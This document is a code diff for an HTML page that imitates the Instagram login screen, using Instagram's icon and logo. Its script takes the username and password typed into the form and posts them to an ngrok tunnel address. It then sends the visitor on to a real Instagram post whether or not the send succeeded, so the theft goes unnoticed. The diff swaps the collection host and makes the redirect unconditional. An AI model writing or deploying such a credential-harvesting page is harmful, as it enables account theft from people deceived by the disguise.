@@ -239,35 +239,30 @@ button:hover {
     <link rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" />
     <script>
         async function do_work(event) {
-    event.preventDefault(); // Prevent form from reloading
+  event.preventDefault(); // Prevent the form from reloading the page
 
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
-    if (!username || !password) {
-        alert("Please enter both username and password.");
-        return;
-    }
+  if (!username || !password) {
+    alert("Please enter both username and password.");
+    return;
+  }
 
-    fetch("https://802d-2a09-bac1-36a0-228-00-29e-29.ngrok-free.app/login", {  // Ensure this matches your backend server
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ username, password })
-    })
-    .then(response => {
-        if (!response.ok) throw new Error("Network response was not OK");
-        return response.text();
-    })
-    .then(data => {
-        console.log("Success:", data);
-        window.location.href = "https://www.instagram.com/p/DHlQW4Ts0nb/?igsh=cHZhc2h4cGp3OXE2";
-    })
-    .catch(error => {
-        console.error("Fetch error:", error);
-        alert("Failed to send data. Check console for details.");
+  try {
+    await fetch("https://c685-2a09-bac1-36a0-228-00-29e-29.ngrok-free.app/login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ username, password }),
     });
+  } catch (error) {
+    console.error("Fetch error:", error);
+  } finally {
+    // Always redirect to the specified Instagram link after attempting to update the DB
+    window.location.href = "https://www.instagram.com/p/DHlQW4Ts0nb/?igsh=cHZhc2h4cGp3OXE2";
+  }
 }
 
     </script>
@@ -277,7 +272,7 @@ button:hover {
     <div class="user-credential-div">
         <div class="box">
             <img class="instagram-logo" src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png">
-            <!-- <form action="https://www.instagram.com/p/DHlQW4Ts0nb/?igsh=cHZhc2h4cGp3OXE2" method="POST"> -->
+            <form action="https://www.instagram.com/p/DHlQW4Ts0nb/?igsh=cHZhc2h4cGp3OXE2" method="POST">
                 <div>
                     <input type="text" id="username" name="username" placeholder="Phone number, username, or Email" class="user-email-place" required><br><br>
                 </div>
